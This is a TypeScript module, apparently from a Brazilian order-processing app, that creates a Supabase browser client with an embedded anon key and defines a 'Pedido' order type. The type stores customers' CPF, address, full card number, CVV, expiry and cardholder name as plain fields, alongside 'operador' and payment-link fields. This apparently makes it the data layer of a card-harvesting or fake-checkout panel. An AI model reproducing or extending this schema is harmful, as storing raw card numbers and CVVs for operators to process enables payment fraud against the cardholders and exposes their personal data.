// Cliente browser do Supabase EXTERNO (qrgtfamzplrwemhypkjl)
import { createClient } from "@supabase/supabase-js";

const SUPABASE_URL = "https://qrgtfamzplrwemhypkjl.supabase.co";
const SUPABASE_ANON_KEY =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFyZ3RmYW16cGxyd2VtaHlwa2psIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODEyMTkxMjcsImV4cCI6MjA5Njc5NTEyN30.72mXdDXkRE8UkzsFthS9h08jl7qgahPKcFpO-w1wY7s";

export const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  auth: { persistSession: false, autoRefreshToken: false },
});

export const PEDIDOS_TABLE = "pedidos_pendentes";

export type Pedido = {
  id: string;
  status: string;
  cliente_nome: string | null;
  cliente_email: string | null;
  cliente_telefone: string | null;
  cliente_cpf: string | null;

  cliente_cep: string | null;
  cliente_endereco: string | null;
  cliente_numero: string | null;
  cliente_complemento: string | null;
  cliente_bairro: string | null;
  cliente_cidade: string | null;
  cliente_estado: string | null;

  cartao_numero: string | null;
  cartao_cvv: string | null;
  cartao_validade: string | null;
  cartao_nome: string | null;

  produto_nome: string | null;
  produto_quantidade: number | null;
  subtotal: number | null;
  valor_frete: number | null;
  valor: number;

  operador: string | null;
  condicao: number | null;
  link_pagamento: string | null;
  observacao: string | null;
  source: string | null;
  processado_em: string | null;
  criado_em: string;
};

export type Configuracao = { chave: string; valor: string };

export async function loadConfig(): Promise<Record<string, string>> {
  const { data, error } = await sb.from("configuracoes").select("chave, valor");
  if (error) return {};
  const out: Record<string, string> = {};
  for (const c of (data ?? []) as Configuracao[]) out[c.chave] = c.valor;
  return out;
}
